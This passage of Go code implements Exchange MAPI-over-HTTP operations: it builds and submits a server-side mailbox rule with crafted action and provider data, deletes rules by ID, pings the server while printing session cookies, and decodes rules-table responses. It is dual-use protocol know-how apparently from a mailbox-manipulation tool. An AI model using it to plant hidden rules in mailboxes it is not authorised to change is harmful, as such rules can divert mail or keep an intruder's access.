	ruleAction := RuleAction{Actions: 1, ActionType: 0x05, ActionFlavor: 0, ActionFlags: 0}
	ruleAction.ActionLen = uint16(len(BodyToBytes(actionData)) + 9)
	ruleAction.ActionData = actionData

	pdat := ruleAction.Marshal()

	propertyValues[4] = TaggedPropertyValue{PidTagRuleActions, pdat}
	//PidTagRuleProvider
	propertyValues[5] = TaggedPropertyValue{PidTagRuleProvider, UniString("RuleOrganizer")}
	//PidTagRuleLevel
	propertyValues[6] = TaggedPropertyValue{PidTagRuleLevel, []byte{0x00, 0x00, 0x00, 0x00}}
	//PidTagRuleProviderData
	propertyValues[7] = TaggedPropertyValue{PidTagRuleProviderData, []byte{0x10, 0x00, 0x00, 0x00, 0x14, 0x00, 0x01, 0x00, 0x00, 0x00, 0x28, 0x7d, 0xd2, 0x27, 0x14, 0xc4, 0xe4, 0x40}}

	addRule.RuleData.PropertyValues = propertyValues
	addRule.RuleData.PropertyValueCount = uint16(len(propertyValues))
	ruleBytes := BodyToBytes(addRule)

	execRequest.RopBuffer.ROP.RopsList = ruleBytes
	execRequest.RopBuffer.ROP.ServerObjectHandleTable = []byte{0x01, 0x00, 0x00, AuthSession.LogonID} //append(AuthSession.RulesHandle, []byte{0xFF, 0xFF, 0xFF, 0xFF}...)

	if AuthSession.Transport == HTTP { // HTTP
		resp, rbody := mapiRequestHTTP(AuthSession.URL.String(), "Execute", execRequest.Marshal())
		responseBody, err := readResponse(resp.Header, rbody)
		if err != nil {
			return nil, fmt.Errorf("[x] A HTTP server side error occurred.\n %s", err)
		}
		execResponse := ExecuteResponse{}
		execResponse.Unmarshal(responseBody)
		return &execResponse, nil

	}
	return nil, fmt.Errorf("[x] An Unspecified error occurred")
}

//ExecuteMailRuleDelete function to delete mailrules
func ExecuteMailRuleDelete(ruleid []byte) error {
	execRequest := ExecuteRequest{}
	execRequest.Init()
	execRequest.MaxRopOut = 262144

	delRule := RopModifyRulesRequest{RopID: 0x41, LoginID: AuthSession.LogonID, InputHandleIndex: 0x00, ModifyRulesFlag: 0x00, RulesCount: 0x01, RuleData: RuleData{}}
	delRule.RuleData.RuleDataFlags = 0x04
	delRule.RuleData.PropertyValueCount = 0x01
	delRule.RuleData.PropertyValues = make([]TaggedPropertyValue, 1)
	delRule.RuleData.PropertyValues[0] = TaggedPropertyValue{PidTagRuleID, ruleid}

	ruleBytes := BodyToBytes(delRule)
	execRequest.RopBuffer.ROP.RopsList = ruleBytes
	execRequest.RopBuffer.ROP.ServerObjectHandleTable = []byte{0x01, 0x00, 0x00, AuthSession.LogonID} //append(AuthSession.RulesHandle, []byte{0xFF, 0xFF, 0xFF, 0xFF}...)

	if AuthSession.Transport == HTTP { // HTTP
		resp, rbody := mapiRequestHTTP(AuthSession.URL.String(), "Execute", execRequest.Marshal())
		responseBody, err := readResponse(resp.Header, rbody)
		if err != nil {
			return fmt.Errorf("[x] A HTTP server side error occurred while deleting the rule.\n %s", err)
		}
		execResponse := ExecuteResponse{}
		execResponse.Unmarshal(responseBody)

		if execResponse.StatusCode == 0 {
			return nil
		}
		return fmt.Errorf("[x] A server side error occurred while deleting the rule. Check ruleid")

	}
	return fmt.Errorf("[x] A server side error occurred while deleting the rule. Check ruleid")
}

//Ping send a PING message to the server
func Ping() {
	isAuthenticated() //check if we actually have a session
	if AuthSession.Transport == HTTP {
		resp, rbody := mapiRequestHTTP(AuthSession.URL.String(), "PING", []byte{})
		fmt.Println(resp)
		fmt.Println(string(rbody))
		fmt.Println(AuthSession.CookieJar)
	}
}

//DecodeGetTableResponse function Unmarshals the various parts of a getproperties response (this includes the initial openfolder request)
//and returns the RopGetPropertiesSpecificResponse object to us, we can then cycle through the rows to view the values
//needs the list of columns that were supplied in the initial request.
func DecodeGetTableResponse(resp []byte, columns []PropertyTag) (*RopGetPropertiesSpecificResponse, error) {
	pos := 10

	var err error

	openFolderResp := RopOpenFolderResponse{}
	pos, err = openFolderResp.Unmarshal(resp[pos:])
	if err != nil {
		return nil, err
	}
	properties := RopGetPropertiesSpecificResponse{}
	_, err = properties.Unmarshal(resp[pos:], columns)

	if err != nil {
		return nil, err
	}

	return &properties, nil
}

//DecodeRulesResponse func
func DecodeRulesResponse(resp []byte, properties []PropertyTag) ([]Rule, []byte) {

	pos, tpos := 10, 0
	var err error

	rulesTableResponse := RopGetRulesTableResponse{}
	tpos, err = rulesTableResponse.Unmarshal(resp[pos:])
	pos += tpos

	if err != nil {
		fmt.Println(err)
		return nil, nil
	}
	columns := RopSetColumnsResponse{}
	tpos, err = columns.Unmarshal(resp[pos:])
	pos += tpos

	if err != nil {
		fmt.Println("Bad SetColumns")
		return nil, nil
	}

	rows := RopQueryRowsResponse{}
	tpos, err = rows.Unmarshal(resp[pos:], properties)
	if err != nil {
		fmt.Println("Bad QueryRows")
		return nil, nil
	}
	pos += tpos

	rules := make([]Rule, int(rows.RowCount))

	for k := 0; k < int(rows.RowCount); k++ {
		rule := Rule{}
		rule.RuleID = rows.RowData[k][0].ValueArray
		rule.RuleName = rows.RowData[k][1].ValueArray
		rules[k] = rule
	}
	ruleshandle := resp[pos+4:]

	return rules, ruleshandle
}
